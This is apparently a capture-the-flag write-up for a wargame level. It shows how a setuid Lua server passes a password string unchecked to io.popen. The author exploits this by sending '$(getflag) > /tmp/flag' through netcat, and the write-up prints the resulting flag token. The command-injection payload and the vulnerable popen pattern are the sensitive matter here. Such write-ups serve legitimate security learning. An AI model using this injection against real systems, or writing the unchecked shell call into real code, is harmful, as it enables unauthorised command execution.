# Level11

## 1. Identity

```bash
$ id
uid=2011(level11) gid=2011(level11) groups=2011(level11),100(users)
```

We are logged in as **level11**.

## 2. Home directory

```bash
$ pwd
/home/user/level11

$ ls -la
[...]
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
[...]
```

## 3. Analyzing the lua file

About lua files : [Wikipedia](https://fr.wikipedia.org/wiki/Lua)

```lua
[...]
local server = assert(socket.bind("127.0.0.1", 5151))
[...]
```

This file creates a local server with an IP adress and a port so let's listen it with netcat and try to understand how we can get our flag.

The vulnerability is here :

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Our code is execuing a bash command without any check.

## 4. Getting our flag

Let's execute a command using netcat inside the prompt :

```bash
$ nc localhost 5151
Password: $(getflag) > /tmp/flag
Erf nope..

$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

We got our flag !